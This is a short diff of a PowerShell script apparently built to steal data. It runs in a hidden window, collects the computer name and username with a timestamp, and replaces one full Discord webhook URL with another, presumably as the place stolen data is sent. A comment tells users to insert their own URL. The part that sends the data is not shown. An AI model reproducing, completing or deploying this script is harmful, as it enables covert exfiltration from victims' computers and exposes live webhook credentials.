@@ -1,7 +1,7 @@
 PowerShell.exe -WindowStyle hidden {
 
 #CHANGE URL TO YOUR URL
-  $url="https://discord.com/api/webhooks/1258905033873948752/OZZKTLx4ACsepNR1J3JDWqlRNev_yJOn-KVisb6mDHfKBDRD5X86MWsiXLa9uhNBadVT" ;
+  $url="https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f" ;
 #Get PC Name+Date+Time
   $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
 
